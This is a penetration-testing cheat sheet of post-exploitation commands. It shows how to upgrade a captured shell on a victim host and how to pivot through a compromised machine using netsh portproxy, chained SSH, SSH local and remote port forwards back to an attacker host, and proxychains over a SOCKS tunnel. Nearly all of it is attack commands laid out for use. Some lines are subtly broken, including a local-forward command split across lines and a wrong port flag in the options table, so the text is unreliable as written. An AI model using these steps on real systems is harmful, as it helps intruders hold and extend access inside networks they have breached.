# Shells

## Upgrading Shells

    $ python -c 'import pty; pty.spawn("/bin/bash")'

    $ ruby -e 'exec "/bin/sh"'

    $ /bin/sh -i

    $ /bin/bash -i

    $ perl -e 'exec "/bin/sh";'

-------

## Upgrading Shells Further

`Things seem off? Sometimes this can return functionality like arrow keys in a shell:`

    victim $ <Ctrl>z
    attacker $ stty raw -echo
    attacker $ fg
    victim $ reset
    victim $ export SHELL=bash
    victim $ export TERM=xterm-256color
    victim $ stty rows 40 columns 80

------

## Netsh Port Proxy

    pivot c:\> netsh interface portproxy add v4tov4 listenport=4000 listenaddress=0.0.0.0 connectport=22 connectaddress=victim.tgt
    attacker $ ssh victimadmin@pivot.tgt

------

## SSH trail through Linux

    attacker $ ssh pivotAdmin@pivot.tgt
    pivot $ ssh victimAdmin@victim.tgt

------

## SSH

Set GatewayPorts `yes` in /etc/ssh/sshd_config, then:

    pivot # systemctl restart sshd

### CLI Options

| **Flag** | **Description** |
|----------|-----------------|
| `-f` | put ssh in the background after connecting |
| `-N` | don’t execute a command; just forward some ports |
| `-P` | num use “num” port for ssh |

### SSH Local Port Forward

    attacker $ ssh -fNL 1337:victim.tgt:22
    pivoter@pivot.tgt attacker $ ssh victimadmin@localhost -P 1337

### SSH Remote Port Forward

    pivot $ ssh -fNR 1337:victim.tgt:22 attacker@attacker.tgt
    attacker $ ssh victimadmin@localhost -P 1337

### Proxychains

check /etc/proxychains.conf

    attacker $ ssh pivotadmin@pivot.tgt -D 9050 -fN
    attacker $ proxychains ssh victimadmin@victim.tgt

